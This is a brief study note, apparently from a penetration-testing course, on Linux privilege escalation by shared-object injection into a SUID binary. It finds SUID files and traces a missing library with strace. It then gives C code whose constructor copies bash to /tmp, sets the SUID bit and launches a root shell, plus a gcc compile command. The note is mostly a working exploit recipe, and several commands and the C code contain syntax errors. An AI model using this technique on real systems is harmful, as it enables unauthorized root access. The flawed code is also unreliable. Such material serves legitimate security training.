To find the files with SUID Permissions run the following command:

```shell
find / -type -f -perm 04000 -ls 2>/dev/null
```

Basically what we're looking for is a place where we can inject something.

So, here TCM ran the above command to see what all files have staff in them. And then, he pulled out a file with so in it which is a shared object and then trying to inject a file there. So, when he runs this file, he sees that something is running. To know what exactly is running, he runs this command:

```shell
strace <path_of_file> 2>&1
```

In the output, he finds something interesting where he sees that it is trying to access a file which does not exist on the system. So, we can exploit this and make a malicious file.

This will be similar to what we did in the [[LD_PRELOAD]] escalation path.

```C
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor))

void inject() {
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p")
}
```

Compile the above using this command:

```shell
gcc -shared -fPIC -o <path_to_inject> <path_of_program>
```